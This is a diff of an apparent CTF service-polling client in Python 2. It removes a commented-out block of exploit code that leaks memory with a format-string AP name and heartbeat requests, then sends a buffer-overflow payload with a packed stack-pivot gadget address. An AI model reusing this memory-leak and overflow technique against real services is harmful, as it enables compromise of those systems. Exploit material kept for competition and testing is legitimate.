@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import os
 import time
 import socket
 import sys
@@ -12,6 +13,7 @@ import signal
 from DiffieHellman import DiffieHellman
 
 PORT = 799
+#PORT = 4060
 SIZE = 4000
 
 ALARM_TIMEOUT_SECS = 25
@@ -847,78 +849,6 @@ class RXCConnection:
 		# Pass
 		return True
 
-		'''	
-		heart_message_request = '\x71\x20\x00' + 
-		self.dch_sequence_number += 1
-		self.send_dch_message( heart_message_request, self.dch_sequence_number )
-
-		recv_msg_data = self.recv_dch_message( )
-
-		if ( recv_msg_data == None ):
-			print "Error -- did not get DCH message data response\n"
-			return
-
-		print "Heart Beat Request Response:\n"
-		print binascii.hexlify(recv_msg_data)
-		
-		test_ap_id1 = self.send_ap_setup_request( "dupe", 0 )
-		test_ap_id2 = self.send_ap_setup_request( "dupe", 0 )
-
-		test_ap_id = self.send_ap_setup_request( "Test AP %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX", 0 )
-
-		# send a AP data write command -- should crash!
-		self.send_ap_data_write_request( test_ap_id, "blah!!!!" )
-		
-		ap_info_recv = self.send_ap_info_request( test_ap_id )
-
-		print "AP Info Request Response:\n"
-		print ap_info_recv[1:]
-		
-		heart_message_request = '\x71\x00\x06'
-		self.dch_sequence_number += 1
-		self.send_dch_message( heart_message_request, self.dch_sequence_number )
-
-		recv_msg_data = self.recv_dch_message( )
-
-		if ( recv_msg_data == None ):
-			print "Error -- did not get DCH message data response\n"
-			return
-
-		print "Heart Beat Request Response:\n"
-		print binascii.hexlify(recv_msg_data)
-
-		# Destroy AP
-		if ( self.send_ap_destroy_request( test_ap_id ) ):
-			print "Successfully destroyed AP ID %d\n" % test_ap_id
-		else:
-			print "Failed to destroy AP ID %d\n" % test_ap_id
-
-		# Get another memory leak of data
-		heart_message_request = '\x71\x00\x06'
-		self.dch_sequence_number += 1
-		self.send_dch_message( heart_message_request, self.dch_sequence_number )
-
-		recv_msg_data = self.recv_dch_message( )
-
-		if ( recv_msg_data == None ):
-			print "Error -- did not get DCH message data response\n"
-			return
-
-		print "Heart Beat Request Response:\n"
-		print binascii.hexlify(recv_msg_data)
-		
-		#self.send_ap_setup_request( 'hello', 0 )
-		# 0x40ba88 -- is jumping into CRC32 seed value -- which is push rbx, pop rsp, ret
-		ap_id = self.send_ap_setup_request( '\xAA'*(64+68+12) + struct.pack('Q', 0x40ba88) + '\xAA'*8, 0 )
-
-		if ( ap_id is None ):
-			print "Failed getting AP ID from setup request\n"
-			return
-		else:
-			# send a AP data write command -- should crash!
-			self.send_ap_data_write_request( ap_id, "blah!!!!" )
-
-		''' 
 
 def sig_alarm_handler( signum, frame ):
 	print "Alarm timeout!\n"
@@ -927,6 +857,7 @@ def sig_alarm_handler( signum, frame ):
 try:
     host = "10.5." + sys.argv[1] + ".4"
     print "Polling team %s\n" % host
+
 
 except:     # Add localhost as the server if no host provided  
     host = "127.0.0.1"
@@ -952,6 +883,12 @@ except socket.error , e:
         print "Error while Connecting to Service : ", e
         sys.exit(-1)
 try:
+    	seed = int( os.urandom(8).encode('hex'), 16 ) #random.randint( 0, 0xffffffff )
+	print "SEED: %X\n" % seed
+    
+	random.seed( seed )
+
+	print "Starting poll\n"
 
 	rxc_con = RXCConnection()
 
